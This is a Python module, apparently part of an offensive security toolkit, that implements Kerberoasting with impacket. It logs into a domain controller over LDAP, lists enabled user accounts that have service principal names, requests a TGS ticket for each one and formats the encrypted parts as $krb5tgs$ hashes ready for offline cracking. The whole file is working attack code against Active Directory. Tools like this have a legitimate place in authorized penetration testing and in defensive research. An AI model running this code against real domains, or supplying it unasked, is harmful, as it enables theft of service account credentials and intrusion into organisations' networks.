"""Kerberoasting utilities."""

from __future__ import annotations

from binascii import hexlify, unhexlify
import logging
from typing import List, Optional, Tuple

from pyasn1.codec.der import decoder
from impacket.examples.utils import ldap_login
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.ldap import ldapasn1
from impacket.ntlm import compute_lmhash, compute_nthash


class Kerberoast:
    """Find SPNs and request TGS tickets for kerberoastable users."""

    def __init__(
        self,
        domain: str,
        username: str,
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        dc_ip: Optional[str] = None,
        request_tgs: bool = True,
    ) -> None:
        self.domain = domain
        self.username = username
        self.password = password or ""
        self.request_tgs = request_tgs
        self.dc_ip = dc_ip

        self.lmhash = ""
        self.nthash = ""

        if hashes:
            self.lmhash, self.nthash = hashes.split(":")

        self.target = domain
        self.base_dn = ",".join(f"dc={x}" for x in domain.split("."))

    def _get_tgt(self) -> dict:
        # NT_PRINCIPAL = 1
        user = Principal(self.username, type=1)

        if self.password and not self.nthash:
            self.lmhash = hexlify(compute_lmhash(self.password)).decode()
            self.nthash = hexlify(compute_nthash(self.password)).decode()

        tgt, cipher, _, session_key = getKerberosTGT(
            user,
            self.password,
            self.domain,
            unhexlify(self.lmhash) if self.lmhash else None,
            unhexlify(self.nthash) if self.nthash else None,
            None,
            kdcHost=self.dc_ip,
        )

        return {
            "KDC_REP": tgt,
            "cipher": cipher,
            "sessionKey": session_key,
        }

    @staticmethod
    def _format_tgs(ticket: bytes, username: str, realm: str, spn: str) -> str:
        decoded = decoder.decode(ticket, asn1Spec=TGS_REP())[0]
        enc = decoded["ticket"]["enc-part"]["cipher"].asOctets()

        checksum = enc[:16]
        data = enc[16:]

        return (
            f"$krb5tgs${constants.EncryptionTypes.rc4_hmac.value}$*"
            f"{username}${realm}${spn.replace(':', '~')}$*"
            f"{hexlify(checksum).decode()}${hexlify(data).decode()}"
        )

    def run(self) -> List[str]:
        ldap_conn = ldap_login(
            self.target,
            self.base_dn,
            self.dc_ip,
            None,
            False,  # Kerberos OFF for LDAP
            self.username,
            self.password,
            self.domain,
            self.lmhash,
            self.nthash,
            None,
        )

        search_filter = (
            "(&(objectCategory=person)"
            "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
            "(servicePrincipalName=*))"
        )

        spns = []

        ldap_conn.search(
            searchFilter=search_filter,
            attributes=["sAMAccountName", "servicePrincipalName"],
            perRecordCallback=lambda x: spns.append(x)
            if isinstance(x, ldapasn1.SearchResultEntry)
            else None,
        )

        ldap_conn.close()

        if not spns:
            return []

        results: List[str] = []

        if not self.request_tgs:
            for item in spns:
                user = None
                for attr in item["attributes"]:
                    if str(attr["type"]) == "sAMAccountName":
                        user = str(attr["vals"][0])
                    elif str(attr["type"]) == "servicePrincipalName":
                        for spn in attr["vals"]:
                            results.append(f"{user}:{spn.asOctets().decode()}")
            return results

        tgt = self._get_tgt()

        for item in spns:
            username = None
            spn_list: List[str] = []

            for attr in item["attributes"]:
                if str(attr["type"]) == "sAMAccountName":
                    username = str(attr["vals"][0])
                elif str(attr["type"]) == "servicePrincipalName":
                    spn_list.extend(s.asOctets().decode() for s in attr["vals"])

            for spn in spn_list:
                # NT_MS_PRINCIPAL = 2
                principal = Principal(
                    spn,
                    type=2,
                )

                try:
                    tgs, _, _, _ = getKerberosTGS(
                        principal,
                        self.domain,
                        self.dc_ip,
                        tgt["KDC_REP"],
                        tgt["cipher"],
                        tgt["sessionKey"],
                    )
                    results.append(
                        self._format_tgs(tgs, username, self.domain.upper(), spn)
                    )
                except Exception as exc:  # pragma: no cover - depends on DC response
                    logging.debug("Failed %s/%s: %s", username, spn, exc)

        return results


def run_kerberoast(
    *,
    domain: str,
    username: str,
    password: str,
    dc_ip: str,
    request_tgs: bool,
) -> Tuple[List[str], Optional[str]]:
    """Run kerberoast and return results and optional error message."""
    try:
        runner = Kerberoast(
            domain=domain,
            username=username,
            password=password,
            dc_ip=dc_ip,
            request_tgs=request_tgs,
        )
        results = runner.run()
    except Exception as exc:
        logging.exception("Kerberoast run failed")
        return [], str(exc)

    return results, None
